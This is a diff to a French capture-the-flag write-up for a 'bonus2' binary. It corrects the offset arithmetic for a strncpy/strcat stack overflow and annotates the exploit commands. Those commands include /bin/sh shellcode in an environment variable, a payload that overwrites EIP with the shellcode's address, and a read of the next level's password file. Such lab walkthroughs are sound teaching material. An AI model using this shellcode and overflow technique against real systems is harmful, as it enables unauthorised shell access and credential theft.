@@ -12,11 +12,11 @@
 	- Les variables `local_60` et `acStack_38` étant adjacentes, si `argv[1]` fait exactement 40 caractères, les deux arguments sont lus comme une seule grande chaîne.
 	- Le programme assigne une variable globale `language` selon `LANG` (`LANG=nl` -> 2, `LANG=fi` -> 1).
 	- Ensuite, `greetuser` prépare une salutation selon la langue et la concatène avec notre grande chaîne à l'aide de `strcat()`.
-- Analyse dynamique :
-	- Dans `greetuser`, le buffer global fait environ 72 octets de long.
-	- Avec `LANG=nl`, la chaîne `"Goedemiddag! "` (14 caractères) est injectée au début.
-	- L'absence de caractère nul entraîne la vraie copie totale de nos arguments : 14 caractères (salutation) + 40 octets (arg1) = 54. Il reste 18 caractères avant d'overflow les 72 octets, plus 4 octets de l'EBP.
-	- En testant avec gdb, on remarque que l'EIP se met à être écrasé exactement à l'offset 23 de notre deuxième argument (`argv[2]`).
+- Analyse dynamique :	
+	- Dans `greetuser`, le buffer local fait exactement 72 octets.
+	- Avec `LANG=nl`, la chaîne `"Goedemiddag! "` (13 caractères) est injectée au début.
+	- Comme `argv[1]` fait exactement 40 caractères, `strncpy` n'ajoute pas de `\0` en fin de `buffer1`. Quand `greetuser` appelle `strcat(greeting, name)`, il lit `buffer1` puis continue dans `buffer2` sans s'arrêter : les deux arguments sont donc concaténés. La salutation + `argv[1]` occupe `13 + 40 = 53` octets. Il reste `72 - 53 = 19` octets d'`argv[2]` avant de déborder du buffer, plus 4 octets d'EBP.
+	- En testant avec gdb, on confirme que l'EIP se met à être écrasé exactement à l'offset `19 + 4 = 23` de notre deuxième argument (`argv[2]`).
 - Vulnérabilité : buffer overflow dans `greetuser` dû à une perte de la délimitation de la chaîne (absence de `\0`) dans `strncpy()`.
 
 ## 3) Exploitation & flag
@@ -29,7 +29,7 @@
 - Commandes utilisées :
 	- `export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`
 	- `echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find`
-	- `env LANG=nl SHELLCODE=$SHELLCODE /tmp/find`
-	- `LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')`
+	- `env LANG=nl SHELLCODE=$SHELLCODE /tmp/find` (l'adresse retournée est propre à l'environnement courant ; elle change si on ajoute ou retire des variables d'environnement)
+	- `LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')` (remplacer `\x3a\xfb\xff\xbf` par l'adresse obtenue ci-dessus, en little-endian)
 - Exécution de commandes :
 	- `cat /home/user/bonus3/.pass`
